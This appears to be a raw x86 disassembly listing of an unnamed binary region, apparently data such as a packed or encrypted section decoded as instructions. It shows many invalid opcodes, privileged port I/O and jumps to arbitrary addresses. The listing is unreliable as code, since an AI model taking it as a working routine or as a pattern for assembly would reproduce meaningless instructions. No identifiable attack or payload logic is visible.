  40c02d:	or     esi,DWORD PTR [esi-0x17]
  40c030:	retf   0x8ac7
  40c033:	mov    bl,0x56
  40c035:	popa   
  40c036:	jno    0x40c009
  40c038:	fwait
  40c039:	repnz sbb al,0x11
  40c03c:	push   eax
  40c03d:	test   BYTE PTR [ecx-0xf],ch
  40c040:	add    al,cl
  40c042:	or     BYTE PTR [edx+0x56],cl
  40c045:	jge    0x40c00c
  40c047:	and    DWORD PTR [ebx],esp
  40c049:	mov    ecx,0x7e78bd69
  40c04e:	add    DWORD PTR [ebx-0x6529a47c],ebp
  40c054:	(bad)  
  40c055:	mov    cl,0x41
  40c057:	pop    edx
  40c058:	rol    DWORD PTR [edx],cl
  40c05a:	lods   eax,DWORD PTR cs:[esi]
  40c05c:	adc    esp,0x43
  40c05f:	outs   dx,BYTE PTR ds:[esi]
  40c060:	jne    0x40c09e
  40c062:	gs pop edx
  40c064:	scas   al,BYTE PTR es:[edi]
  40c065:	or     bh,BYTE PTR [esi+0x69]
  40c068:	or     BYTE PTR [esi+0x89d879],bl
  40c06e:	cmp    BYTE PTR [edx-0x17b6bdd0],0xd4
  40c075:	iret   
  40c076:	mov    edi,0x25b421e8
  40c07b:	cmp    dl,BYTE PTR [edi-0x48d92937]
  40c081:	push   esi
  40c082:	fbld   TBYTE PTR [ebp+ecx*2+0x27898262]
  40c089:	xchg   BYTE PTR [esi+0x37f143eb],dh
  40c08f:	cwde   
  40c090:	inc    DWORD PTR [ebx]
  40c092:	mov    al,ds:0xe5558c70
  40c097:	xlat   BYTE PTR ds:[ebx]
  40c098:	hlt    
  40c099:	lahf   
  40c09a:	scas   al,BYTE PTR es:[edi]
  40c09b:	dec    edi
  40c09c:	stc    
  40c09d:	xchg   esp,eax
  40c09e:	push   ebx
  40c09f:	adc    eax,0x7a22f6e3
  40c0a4:	in     al,0x3a
  40c0a6:	sbb    cl,BYTE PTR [eax-0x743902b7]
  40c0ac:	sub    al,0x97
  40c0ae:	jmp    0xaeb5:0xc5087af6
  40c0b5:	or     al,BYTE PTR [eax]
  40c0b7:	in     al,dx
  40c0b8:	call   0x12d24445
  40c0bd:	pusha  
  40c0be:	mov    ecx,0x88af6fac
  40c0c3:	xor    BYTE PTR [ebx],dl
  40c0c5:	clc    
  40c0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0c7:	inc    edx
  40c0c8:	inc    esp
  40c0c9:	cwde   
  40c0ca:	rcl    BYTE PTR [ebp-0x31066ea0],1
  40c0d0:	xor    ebx,edx
  40c0d2:	add    al,0xf2
  40c0d4:	mov    ds:0x7ccc10b,eax
  40c0d9:	cmp    BYTE PTR [ebx+0xf],dh
  40c0dc:	sub    DWORD PTR [ecx-0x7d],esi
  40c0df:	popa   
  40c0e0:	fwait
  40c0e1:	test   al,0x76
  40c0e3:	bound  edx,QWORD PTR [edx+0x3e14c415]
  40c0e9:	sub    al,0xd4
  40c0eb:	mov    al,0x13
  40c0ed:	mov    fs,WORD PTR [edi]
  40c0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0f0:	into   
  40c0f1:	inc    ecx
  40c0f2:	(bad)  
  40c0f3:	xchg   ecx,eax
  40c0f4:	outs   dx,DWORD PTR ds:[esi]
  40c0f5:	xor    eax,0x348de5c8
  40c0fa:	nop
  40c0fb:	jge    0x40c0fb
  40c0fd:	lods   eax,DWORD PTR ds:[si]
  40c0ff:	test   BYTE PTR [esi],ah
  40c101:	in     eax,dx
  40c102:	sub    al,0x61
  40c104:	out    0x73,al
  40c106:	or     eax,0x4adb3868
  40c10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c10c:	(bad)  
  40c10d:	icebp  
  40c10e:	xor    edx,DWORD PTR [esi-0x3f]
  40c111:	adc    eax,0x458073de
  40c116:	sub    DWORD PTR [eax+0x36d5ab47],ebx
  40c11c:	cdq    
  40c11d:	mov    ebp,0x683f855c
  40c122:	shr    BYTE PTR [ebx-0x2cefb6a7],cl
  40c128:	in     eax,dx
  40c129:	mov    ch,0xa9
  40c12b:	add    BYTE PTR [esi-0x7adcbe37],bh
  40c131:	out    dx,al
  40c132:	mov    edx,0x1dcced23
  40c137:	xor    esp,DWORD PTR [edi-0x2d]
  40c13a:	or     eax,0xdef65d82
  40c13f:	fsub   st,st(0)
  40c141:	rcr    BYTE PTR [ebp+0x4b7265f6],cl
  40c147:	daa    
  40c148:	xor    eax,0x466fdb2a
  40c14d:	mov    ah,al
  40c14f:	dec    esi
  40c150:	pop    ss
  40c151:	jnp    0x40c102
  40c153:	scas   al,BYTE PTR es:[edi]
  40c154:	ja     0x40c19f
  40c156:	mov    ebx,0x2fabf003
  40c15b:	das    
  40c15c:	pushf  
  40c15d:	pop    edx
  40c15e:	imul   ecx,DWORD PTR [ebp-0x58],0xffffffd7
  40c162:	pop    es
  40c163:	dec    edx
  40c164:	sbb    esi,DWORD PTR [ebp+0x56]
  40c167:	ss mov al,0x1b
  40c16a:	dec    eax
  40c16b:	push   eax
  40c16c:	jg     0x40c11a
  40c16e:	mov    ah,0x6c
  40c170:	push   esp
  40c171:	stc    
  40c172:	mov    ds:0xabad8dd4,eax
  40c177:	dec    ebp
  40c178:	rcr    DWORD PTR ds:0x9919b304,cl
  40c17e:	mov    bl,0x83
  40c180:	out    dx,al
  40c181:	push   0x2973cc46
  40c186:	sub    al,0x1c
  40c188:	xor    BYTE PTR [ecx],dh
  40c18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c18b:	sbb    ah,BYTE PTR [ebp+0xb]
  40c18e:	xchg   ecx,eax
  40c18f:	xlat   BYTE PTR ds:[ebx]
  40c190:	push   esi
  40c191:	mov    BYTE PTR [edi-0x7d109678],ah
  40c197:	aas    
  40c198:	pop    edx
  40c199:	into   
  40c19a:	aas    
  40c19b:	call   0x4c6d233c
  40c1a0:	retf   0xa06c
  40c1a3:	xor    bl,BYTE PTR [edi-0x75d6acfe]
  40c1a9:	fld    st(2)
  40c1ab:	jmp    0x38ba70c8
  40c1b0:	leave  
  40c1b1:	pusha  
  40c1b2:	inc    ebx
  40c1b3:	dec    esi
  40c1b4:	adc    DWORD PTR [ebx-0x37cd4798],esp
  40c1ba:	sub    DWORD PTR [edi+0x34ef387b],ebx
  40c1c0:	cwde   
  40c1c1:	or     DWORD PTR [esi-0x7],ecx
  40c1c4:	dec    esp
  40c1c5:	out    dx,al
  40c1c6:	xchg   edi,eax
  40c1c7:	or     al,0xc9
  40c1c9:	iret   
  40c1ca:	icebp  
  40c1cb:	data16 aam 0x11
  40c1ce:	adc    DWORD PTR [esi+0x37004568],0xc
  40c1d5:	test   al,0xe9
  40c1d7:	(bad)  
  40c1d8:	jae    0x40c1d4
  40c1da:	(bad)  [esi+0x63971f31]
  40c1e0:	or     eax,0xf54a0bf2
  40c1e5:	int    0x53
  40c1e7:	push   edi
  40c1e8:	mov    esi,0x36b6c8c0
  40c1ed:	retf   
  40c1ee:	adc    cl,BYTE PTR [ecx-0x36]
  40c1f1:	push   edi
  40c1f2:	mov    ds:0x1d32ada9,al
  40c1f7:	sub    eax,0x2c6d3397
  40c1fc:	shl    BYTE PTR [esi],cl
  40c1fe:	cld    
  40c1ff:	or     DWORD PTR [ecx],eax
  40c201:	lea    ebx,ds:0xd4aaf6e9
  40c207:	es mov ch,0xea
  40c20a:	popf   
  40c20b:	push   es
  40c20c:	out    dx,al
  40c20d:	adc    al,0x1f
  40c20f:	cdq    
  40c210:	bnd jge 0x40c1b0
  40c213:	dec    esi
  40c214:	shr    BYTE PTR [esi-0x59],1
  40c217:	adc    cl,dl
  40c219:	sti    
  40c21a:	js     0x40c22c
  40c21c:	or     BYTE PTR [ebx-0x65],0x63
  40c220:	or     al,0x2d
  40c222:	ins    DWORD PTR es:[edi],dx
  40c223:	adc    eax,0x29501b32
  40c228:	ror    DWORD PTR [eax-0x33],1
  40c22b:	push   eax
  40c22c:	imul   DWORD PTR [esi]
  40c22e:	call   0x8b91:0x28ada8e6
  40c235:	sahf   
  40c236:	sbb    eax,0xfdbe1cf
  40c23b:	sub    al,0x90
  40c23d:	div    DWORD PTR [edx-0x5b]
  40c240:	sbb    BYTE PTR [eax],bh
  40c242:	loopne 0x40c29e
  40c244:	loop   0x40c24f
  40c246:	retf   0xeb7
  40c249:	leave  
  40c24a:	sbb    DWORD PTR [ecx-0x58],ecx
  40c24d:	fadd   QWORD PTR [edi+0x508e2408]
  40c253:	jmp    0xb61640f1
  40c258:	inc    edi
  40c259:	and    eax,0xd444ae8b
  40c25e:	outs   dx,DWORD PTR ds:[esi]
  40c25f:	jmp    0x40c24e
  40c261:	push   eax
  40c262:	inc    edi
  40c263:	sar    BYTE PTR [ebx],1
  40c265:	push   ds
  40c266:	jge    0x40c28c
  40c268:	mov    ds:0x5afb71d2,al
  40c26d:	mov    dh,0x28
  40c26f:	or     eax,0xb9a50ce5
  40c274:	daa    
  40c275:	sbb    DWORD PTR [eax-0x7a],esi
  40c278:	pop    eax
  40c279:	pop    esi
  40c27a:	or     eax,DWORD PTR [ebx]
  40c27c:	test   al,0xe3
  40c27e:	ficom  WORD PTR [edx-0x71]
  40c281:	rcl    BYTE PTR [ebx],cl
  40c283:	dec    edi
  40c284:	sub    eax,DWORD PTR [edi]
  40c286:	mov    cs,WORD PTR [eax+0x29]
  40c289:	mov    al,cl
  40c28b:	leave  
  40c28c:	jns    0x40c212
  40c28e:	or     bh,al
  40c290:	out    dx,eax
  40c291:	(bad)  
  40c293:	(bad)  
  40c295:	pop    esp
  40c296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c297:	sahf   
  40c298:	push   esp
  40c299:	(bad)  
  40c29a:	icebp  
  40c29b:	dec    eax
  40c29c:	inc    ebx
  40c29d:	and    al,0x96
  40c29f:	shl    bl,1
  40c2a1:	xor    al,0xba
  40c2a3:	inc    edx
  40c2a4:	retf   
  40c2a5:	fld    st(6)
  40c2a7:	jle    0x40c23f
  40c2a9:	arpl   WORD PTR [ecx+0x7537e875],dx
  40c2af:	mov    DWORD PTR [esi+esi*8-0xd],esp
  40c2b3:	cmp    esi,DWORD PTR [eax]
  40c2b5:	jle    0x40c30b
  40c2b7:	jmp    0xe3c62853
  40c2bc:	dec    esi
  40c2bd:	inc    ebp
  40c2be:	repnz xchg esi,eax
  40c2c0:	mov    ah,0x52
  40c2c2:	xor    BYTE PTR [edi-0x63af88a5],bh
  40c2c8:	nop
  40c2c9:	jle    0x40c32b
  40c2cb:	loopne 0x40c2a0
  40c2cd:	fdivp  st(1),st
  40c2cf:	fdiv   st,st(1)
  40c2d1:	xor    bh,BYTE PTR [ebx]
  40c2d3:	hlt    
  40c2d4:	lods   eax,DWORD PTR ds:[esi]
  40c2d5:	(bad)  
  40c2d7:	or     eax,0x27af1507
  40c2dc:	xchg   dh,bl
  40c2de:	pushf  
  40c2df:	aaa    
  40c2e0:	add    al,0xa
  40c2e2:	push   es
  40c2e3:	out    0x3b,eax
  40c2e5:	out    dx,al
  40c2e6:	mov    ecx,0xe013c2f4
  40c2eb:	mov    ebp,0x2706db3c
  40c2f0:	fnstsw WORD PTR [edi+0x6f]
  40c2f3:	mov    edi,0x7694ddf
  40c2f8:	mov    edx,0xecd8bdd8
  40c2fd:	push   es
  40c2fe:	imul   edx,DWORD PTR [edi+0x7e],0x0
  40c302:	mov    fs,edx
  40c304:	xchg   edx,eax
  40c305:	ret    
  40c306:	imul   esi,esp,0xef25fd24
  40c30c:	dec    edx
  40c30d:	sub    al,0xef
  40c30f:	push   edi
  40c310:	outs   dx,BYTE PTR ds:[esi]
  40c311:	fidivr DWORD PTR ds:0xfc27d0ed
  40c317:	out    dx,al
  40c318:	sub    DWORD PTR [ebx+eax*2],ebx
  40c31b:	mov    ds:0xb26152d,al
  40c320:	dec    ebp
  40c321:	nop
  40c322:	imul   esp,DWORD PTR [ecx+0x49cca79f],0xffffffba
  40c329:	inc    edx
  40c32a:	shl    DWORD PTR [esi+edx*2-0x78],0x8
  40c32f:	sub    BYTE PTR [ebp+0x4d936434],cl
  40c335:	lea    eax,[edx]
  40c337:	idiv   DWORD PTR [esi+0x44]
  40c33a:	int3   
  40c33b:	jae    0x40c34c
  40c33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c33e:	dec    esi
  40c33f:	sbb    ebx,DWORD PTR [edi]
  40c341:	push   ebx
  40c342:	add    BYTE PTR [edx],0x74
  40c345:	aad    0x83
  40c347:	cmp    BYTE PTR [ebx-0xa],bl
  40c34a:	jo     0x40c319
  40c34c:	pop    ebx
  40c34d:	int3   
  40c34e:	stc    
  40c34f:	pop    ss
  40c350:	test   BYTE PTR [edx+0xb42f0b9],al
  40c356:	aaa    
  40c357:	retf   
  40c358:	or     DWORD PTR [ebx+edx*4],eax
  40c35b:	ins    DWORD PTR es:[edi],dx
  40c35c:	mov    edx,0x72c1a0b
  40c361:	and    al,0x9
  40c363:	cmp    edi,ecx
  40c365:	popa   
  40c366:	sbb    BYTE PTR [edi],ch
  40c368:	fs clc 
  40c36a:	inc    ebx
  40c36b:	sbb    DWORD PTR [eax+0xb53d35b],0xfffffff6
  40c372:	push   0xfffffffc
  40c374:	cmp    DWORD PTR [ecx],0x32
  40c377:	pop    ds
  40c378:	shl    DWORD PTR [ecx+0x38],1
  40c37b:	add    DWORD PTR [esi],0x34
  40c37e:	ins    BYTE PTR es:[edi],dx
  40c37f:	fimul  WORD PTR [edx-0x6d792731]
  40c385:	fcmovnbe st,st(2)
  40c387:	fs arpl sp,si
  40c38a:	repnz xor DWORD PTR [ecx+0x400b1a8],eax
  40c391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c392:	sbb    al,0x6
  40c394:	neg    BYTE PTR [esi-0x6c]
  40c397:	and    eax,DWORD PTR [edx+0x5f]
  40c39a:	enter  0xd338,0xc9
  40c39e:	jle    0x40c365
  40c3a0:	add    eax,0xaaff6fd7
  40c3a5:	xchg   esi,eax
  40c3a6:	(bad)  
  40c3a8:	daa    
  40c3a9:	mov    ebp,0x9575cad4
  40c3ae:	jno    0x40c3b6
  40c3b0:	and    BYTE PTR [ebp-0x3383b366],bl
  40c3b6:	and    eax,0x601e0437
  40c3bb:	mov    ah,0x48
  40c3bd:	out    dx,eax
  40c3be:	test   DWORD PTR [ebp+eiz*1-0x6f],0x5fc291b7
  40c3c6:	lahf   
  40c3c7:	les    ebx,FWORD PTR [edx]
  40c3c9:	(bad)  
  40c3ca:	sbb    dh,BYTE PTR [ebp+edi*8+0x4a392e52]
  40c3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3d2:	aaa    
  40c3d3:	mov    ah,0xf4
  40c3d5:	push   edx
  40c3d6:	and    BYTE PTR [ecx],bl
  40c3d8:	mov    bh,0x1f
  40c3da:	cli    
  40c3db:	pop    es
  40c3dc:	mov    ebp,DWORD PTR [eax]
  40c3de:	out    0x4b,al
  40c3e0:	out    dx,al
  40c3e1:	pop    esi
  40c3e2:	bound  ebx,QWORD PTR [ecx-0x43f06350]
  40c3e8:	stos   DWORD PTR es:[edi],eax
  40c3e9:	or     eax,DWORD PTR [eax-0x58bc4672]
  40c3ef:	xchg   ebp,eax
  40c3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3f1:	int3   
  40c3f2:	nop
  40c3f3:	cmc    
  40c3f4:	enter  0x396d,0x94
  40c3f8:	pop    eax
  40c3f9:	jge    0x40c3c2
  40c3fb:	and    cl,ch
  40c3fd:	dec    eax
  40c3fe:	adc    DWORD PTR [eax],0xdf322ee8
  40c404:	inc    esp
  40c405:	adc    bl,al
  40c407:	rcl    BYTE PTR [eax-0x1f],cl
  40c40a:	adc    eax,0x8c81def9
  40c40f:	shl    BYTE PTR [esi-0x5f],1
  40c412:	sbb    dh,BYTE PTR ds:0x94dd9556
  40c418:	rol    bl,0xa9
  40c41b:	outs   dx,BYTE PTR ds:[esi]
  40c41c:	cs xchg esp,eax
  40c41e:	lods   al,BYTE PTR ds:[esi]
  40c41f:	inc    edi
  40c420:	lahf   
  40c421:	lods   eax,DWORD PTR ds:[esi]
  40c422:	das    
  40c423:	adc    al,BYTE PTR [bx+si+0x4d]
  40c427:	adc    esp,DWORD PTR [eax-0x58059f38]
  40c42d:	jne    0x40c424
  40c42f:	dec    esp
  40c430:	xchg   esi,eax
  40c431:	dec    ebx
  40c432:	pop    ds
  40c433:	sub    esi,edx
  40c435:	dec    edx
  40c436:	mov    ch,BYTE PTR [edx+0x7c]
  40c439:	lock and edi,edx
  40c43c:	cmp    eax,0x9a8dd157
  40c441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c442:	pop    ds
  40c443:	inc    ebx
  40c444:	lahf   
  40c445:	mov    ebx,es
  40c447:	pop    esi
  40c448:	mov    ebx,0xecf297a4
  40c44d:	in     eax,0xfe
  40c44f:	(bad)  
  40c451:	dec    esp
  40c452:	mov    bl,0xfa
  40c454:	(bad)  
  40c455:	aam    0x54
  40c457:	push   edx
  40c458:	adc    eax,0x6024f0f8
  40c45d:	push   ebp
  40c45e:	push   esi
  40c45f:	repz pop edi
  40c461:	cmp    DWORD PTR [eax],0x77876256
  40c467:	mov    al,BYTE PTR [ebp+eax*8-0x46]
  40c46b:	sbb    eax,0xd045b70b
  40c470:	cmp    ah,cl
  40c472:	mov    edx,0xd71ae214
  40c477:	jns    0x40c45e
  40c479:	mov    dh,bh
  40c47b:	add    BYTE PTR [ebp+0x1b],bl
  40c47e:	mov    edi,0x8579368
  40c483:	and    BYTE PTR [esi+0x3],0x27
  40c487:	loopne 0x40c469
  40c489:	add    eax,0x51186f2d
  40c48e:	cmp    BYTE PTR [ecx+ebx*2],bl
  40c491:	sub    BYTE PTR [edx+0x2b],bl
  40c494:	jmp    0x40c466
  40c496:	mov    ds:0x48f93abb,eax
  40c49b:	mov    edi,DWORD PTR [esi-0x748a1aee]
  40c4a1:	mov    edi,0xbfe654f8
  40c4a6:	popa   
  40c4a7:	fistp  QWORD PTR [edx+edx*2+0x1f]
  40c4ab:	push   ecx
  40c4ac:	test   eax,0x6384e36d
  40c4b1:	mov    bh,0x79
  40c4b3:	sbb    bh,bl
  40c4b5:	bound  esp,QWORD PTR [esi+0x66]
  40c4b8:	into   
  40c4b9:	inc    edx
  40c4ba:	js     0x40c44c
  40c4bc:	fsubr  DWORD PTR [ebx+0x48]
  40c4bf:	out    0x6a,al
  40c4c1:	inc    esp
  40c4c2:	repz je 0x40c4bc
  40c4c5:	push   ecx
  40c4c6:	inc    eax
  40c4c7:	mov    edi,0x62d1f970
  40c4cc:	fadd   st,st(6)
  40c4ce:	add    al,BYTE PTR [edi-0x637cd5a8]
  40c4d4:	sub    al,0x7b
  40c4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d7:	dec    esp
  40c4d8:	sbb    BYTE PTR [ebx],dl
  40c4da:	aaa    
  40c4db:	xor    dl,al
  40c4dd:	or     eax,0x93bcacfa
  40c4e2:	lods   eax,DWORD PTR ds:[esi]
  40c4e3:	xchg   edi,eax
  40c4e4:	cmp    eax,0x3e347d7e
  40c4e9:	jge    0x40c521
  40c4eb:	pop    ss
  40c4ec:	mov    ecx,0x12a4c5bf
  40c4f1:	pop    esi
  40c4f2:	test   al,0xb2
  40c4f4:	test   al,0xec
  40c4f6:	ret    
  40c4f7:	daa    
  40c4f8:	mov    ss,WORD PTR [ebp+0x2c]
  40c4fb:	iret   
  40c4fc:	xor    BYTE PTR [ebx],ah
  40c4fe:	mov    dh,0x48
  40c500:	(bad)  
  40c501:	jns    0x40c4ab
  40c503:	dec    esp
  40c504:	push   0x84df173a
  40c509:	(bad)  
  40c50a:	repz sub ecx,DWORD PTR [edi]
  40c50d:	cmp    edx,DWORD PTR [edx]
  40c50f:	and    esi,DWORD PTR [ebx+0x3b]
  40c512:	xor    eax,0x88b2d5e3
  40c517:	in     eax,dx
  40c518:	dec    eax
  40c519:	and    dh,BYTE PTR [ecx+0x6247dfb4]
  40c51f:	xchg   edx,eax
  40c520:	jge    0x40c4d3
  40c522:	or     ah,al
  40c524:	jp     0x40c525
  40c526:	xor    esi,esi
  40c528:	adc    esi,DWORD PTR [eax-0x2aad7997]
  40c52e:	pop    ebp
  40c52f:	mov    dl,0xab
  40c531:	jle    0x40c54b
  40c533:	push   eax
  40c534:	in     al,0x91
  40c536:	mov    ebp,0xc70d4759
  40c53b:	and    eax,0xf43f092a
  40c540:	inc    edx
  40c541:	in     eax,0xa4
  40c543:	sbb    BYTE PTR [esi],dh
  40c545:	mov    ah,0xf9
  40c547:	adc    eax,0x12a450b
  40c54c:	in     al,dx
  40c54d:	and    eax,0xba0be271
  40c552:	dec    ebx
  40c553:	mov    edx,0x64ddf613
  40c558:	pop    edi
  40c559:	pop    esi
  40c55a:	mov    WORD PTR [ebp-0x6c0106eb],fs
  40c560:	(bad)  
  40c562:	add    bh,ch
  40c564:	popf   
  40c565:	sub    ebp,eax
  40c567:	iret   
  40c568:	xchg   ebx,eax
  40c569:	xor    BYTE PTR [edi+0x18786c54],dl
  40c56f:	jbe    0x40c582
  40c571:	xor    dh,BYTE PTR [edi-0x107dd53e]
  40c577:	fs ja  0x40c52e
  40c57a:	push   esi
  40c57b:	scas   eax,DWORD PTR es:[edi]
  40c57c:	outs   dx,BYTE PTR ds:[esi]
  40c57d:	lahf   
  40c57e:	retf   
  40c57f:	std    
  40c580:	xchg   edx,ecx
  40c582:	xchg   edx,eax
  40c583:	(bad)  
  40c584:	adc    eax,0xcd899851
  40c589:	loopne 0x40c585
  40c58b:	sbb    eax,0xcea37fac
  40c590:	mov    ds:0x766d60a2,al
  40c595:	call   0xfc93:0xdd9bfd68
  40c59c:	push   ebx
  40c59d:	imul   ebp,DWORD PTR [edi+esi*8-0x69],0x7b
  40c5a2:	mov    eax,ds:0xc696bfc3
  40c5a7:	jmp    0x40c541
  40c5a9:	sub    cl,bl
  40c5ab:	call   0x751e:0x490ed7ea
  40c5b2:	fcmovne st,st(7)
  40c5b4:	push   0x7a9441ea
  40c5b9:	push   ss
  40c5ba:	bound  ecx,QWORD PTR [eax+ebx*8-0x6a]
  40c5be:	icebp  
  40c5bf:	sbb    al,0x8a
  40c5c1:	fnstsw WORD PTR [edx+0x1d]
  40c5c4:	or     DWORD PTR [eax],0xffffff83
  40c5c7:	inc    ebx
  40c5c8:	rcr    DWORD PTR [edi-0x63],1
  40c5cb:	clc    
  40c5cc:	fistp  DWORD PTR [ecx+0x2]
  40c5cf:	je     0x40c598
  40c5d1:	sbb    ch,ah
  40c5d3:	cld    
  40c5d4:	ja     0x40c55c
  40c5d6:	or     cl,BYTE PTR [ecx+0x6b]
  40c5d9:	leave  
  40c5da:	or     edi,DWORD PTR [ecx-0x11]
  40c5dd:	mov    DWORD PTR [ebx+edx*8+0x7a],esp
  40c5e1:	sbb    DWORD PTR [edi-0x60],0x607e48d1
  40c5e8:	push   ecx
  40c5e9:	leave  
  40c5ea:	or     al,0x27
  40c5ec:	addr16 mov ecx,es
  40c5ef:	in     eax,dx
  40c5f0:	mov    ecx,DWORD PTR [eax-0x44eaff53]
  40c5f6:	push   edi
  40c5f7:	adc    DWORD PTR [eax-0x24c0fc7d],eax
  40c5fd:	sbb    DWORD PTR [edi+eax*4],0xffffffb4
  40c601:	in     eax,dx
  40c602:	arpl   sp,bp
  40c604:	push   0x1f51d925
  40c609:	ins    BYTE PTR es:[edi],dx
  40c60a:	pop    edx
  40c60b:	scas   al,BYTE PTR es:[edi]
  40c60c:	ins    DWORD PTR es:[edi],dx
  40c60d:	dec    ebp
  40c60e:	jl     0x40c664
  40c610:	dec    ecx
  40c611:	mov    dh,0xc8
  40c613:	adc    ecx,DWORD PTR [esi+ebx*4]
  40c616:	sub    ecx,esp
  40c618:	dec    edx
  40c619:	push   ds
  40c61a:	dec    esi
  40c61b:	test   BYTE PTR [ebp+0x54],bl
  40c61e:	(bad)
  40c622:	int    0x25
  40c624:	inc    eax
  40c625:	sub    eax,0xf439fb91
  40c62a:	xchg   esp,eax
  40c62b:	push   ebp
  40c62c:	push   esp
  40c62d:	ds mov dl,0xaf
  40c630:	mov    ecx,0xd837a47
  40c635:	outs   dx,BYTE PTR ds:[esi]
  40c636:	loopne 0x40c5df
  40c638:	pop    eax
  40c639:	in     eax,0x9a
  40c63b:	add    esi,DWORD PTR [ebp+0x7c]
  40c63e:	mov    ah,0x95
  40c640:	sub    al,0x56
  40c642:	ins    DWORD PTR es:[edi],dx
  40c643:	adc    eax,DWORD PTR [ebp+ecx*4+0x61]
  40c647:	int    0xd8
  40c649:	mov    ch,0x2
  40c64b:	jno    0x40c5fd
  40c64d:	inc    ebx
  40c64e:	cdq    
  40c64f:	shl    BYTE PTR [edi],cl
  40c651:	xchg   edx,eax
  40c652:	dec    ebx
  40c653:	pop    ds
  40c654:	push   ebx
  40c655:	mov    dl,0x6e
  40c657:	xchg   ebp,eax
  40c658:	daa    
  40c659:	and    bl,dh
  40c65b:	pop    ebp
  40c65c:	xchg   BYTE PTR [ebp+0x19],ch
  40c65f:	lock mov BYTE PTR [esi-0x7],dh
  40c663:	sbb    esi,esi
  40c665:	lods   al,BYTE PTR ds:[esi]
  40c666:	test   eax,0x681ac5e1
  40c66b:	retf   
  40c66c:	hlt    
  40c66d:	sbb    al,0x68
  40c66f:	add    cl,bh
  40c671:	sub    ah,BYTE PTR [ebx+ebx*2-0x7b120f1]
  40c678:	jmp    0x80832e5b
  40c67d:	push   ss
  40c67e:	push   0xffffffd7
  40c680:	cmp    DWORD PTR [ebp+0x5d1d9972],eax
  40c686:	call   0x1c66:0x9763147f
  40c68d:	mov    dh,0x76
  40c68f:	scas   al,BYTE PTR es:[edi]
  40c690:	arpl   WORD PTR [esp+edi*2+0x14],si
  40c694:	stos   DWORD PTR es:[edi],eax
  40c695:	xor    edx,edx
  40c697:	inc    esi
  40c698:	shl    bl,cl
  40c69a:	inc    edx
  40c69b:	ja     0x40c6d2
  40c69d:	xchg   ecx,eax
  40c69e:	inc    esp
  40c69f:	fadd   st,st(1)
  40c6a1:	xlat   BYTE PTR ds:[ebx]
  40c6a2:	ror    BYTE PTR [edx-0x27],0x89
  40c6a6:	(bad)  
  40c6a7:	cdq    
  40c6a8:	ret    
  40c6a9:	in     eax,dx
  40c6aa:	lods   eax,DWORD PTR ds:[esi]
  40c6ab:	std    
  40c6ac:	add    dl,BYTE PTR [ecx-0x119f526c]
  40c6b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6b3:	push   esp
  40c6b4:	inc    ecx
  40c6b5:	into   
  40c6b6:	jbe    0x40c685
  40c6b8:	mov    ecx,0x3a65f75b
  40c6bd:	pop    es
  40c6be:	ja     0x40c688
  40c6c0:	inc    eax
  40c6c1:	mov    dl,0x31
  40c6c3:	mov    bl,0x88
  40c6c5:	sub    al,0xa7
  40c6c7:	retf   0xecf3
  40c6ca:	es mov eax,0xe140284c
  40c6d0:	cwde   
  40c6d1:	into   
  40c6d2:	pop    edx
  40c6d3:	xchg   ebx,eax
  40c6d4:	lock ins BYTE PTR es:[edi],dx
  40c6d6:	loop   0x40c738
  40c6d8:	push   ss
  40c6d9:	cmp    edi,esi
  40c6db:	adc    al,0xde
  40c6dd:	push   ss
  40c6de:	popf   
  40c6df:	inc    ecx
  40c6e0:	mov    edx,0x7f6e6ac5
  40c6e5:	or     BYTE PTR [eax-0x48],ch
  40c6e8:	scas   eax,DWORD PTR es:[edi]
  40c6e9:	and    BYTE PTR [eax-0x63],0xa1
  40c6ed:	lds    esp,FWORD PTR [eax+0x7d]
  40c6f0:	xor    al,BYTE PTR [eax]
  40c6f2:	add    eax,0x466ade45
  40c6f7:	cmp    al,0xf2
  40c6f9:	in     eax,dx
  40c6fa:	jbe    0x40c6c8
  40c6fc:	or     al,0x73
  40c6fe:	or     eax,0x338dd0e3
  40c703:	mov    ebx,0xf824507d
  40c708:	inc    eax
  40c709:	rcl    DWORD PTR [esp+ebp*8-0x69],0x28
  40c70e:	add    DWORD PTR [ecx-0x2c],0x44f8495f
  40c715:	cs push es
  40c717:	fsub   st,st(7)
  40c719:	into   
  40c71a:	clc    
  40c71b:	es fwait
  40c71d:	das    
  40c71e:	fist   WORD PTR [edx-0x17]
  40c721:	inc    ebx
  40c722:	xchg   ecx,eax
  40c723:	pop    ebx
  40c724:	(bad)  
  40c726:	(bad)  
  40c727:	call   0xa5390e0e
  40c72c:	ins    BYTE PTR es:[edi],dx
  40c72d:	mov    dh,0xef
  40c72f:	mov    esi,0xb685efff
  40c734:	neg    DWORD PTR [esi-0x19040b6c]
  40c73a:	sbb    eax,0x664f7dd5
  40c73f:	in     eax,dx
  40c740:	in     al,0x6
  40c742:	scas   eax,DWORD PTR es:[edi]
  40c743:	cmp    edx,DWORD PTR [edi+0x536fafb7]
  40c749:	mov    ebx,0xd43f2c37
  40c74e:	add    eax,0x756890a7
  40c753:	mov    cl,0x8
  40c755:	mov    eax,DWORD PTR [ecx+edi*2-0x655a3b1b]
  40c75c:	cld    
  40c75d:	lea    esp,[eax+0x70624d16]
  40c763:	or     eax,0x875cbc4c
  40c768:	ja     0x40c77e
  40c76a:	shl    BYTE PTR [edi-0x35],1
  40c76d:	sbb    ebx,DWORD PTR [eax]
  40c76f:	or     DWORD PTR [edi],ebp
  40c771:	nop
  40c772:	or     BYTE PTR [edx-0x7],ah
  40c775:	xchg   ecx,esp
  40c777:	div    BYTE PTR [ebx]
  40c779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c77a:	ins    BYTE PTR es:[edi],dx
  40c77b:	mov    ch,bh
  40c77d:	jae    0x40c727
  40c77f:	cs pop esp
  40c781:	repnz xchg ebx,eax
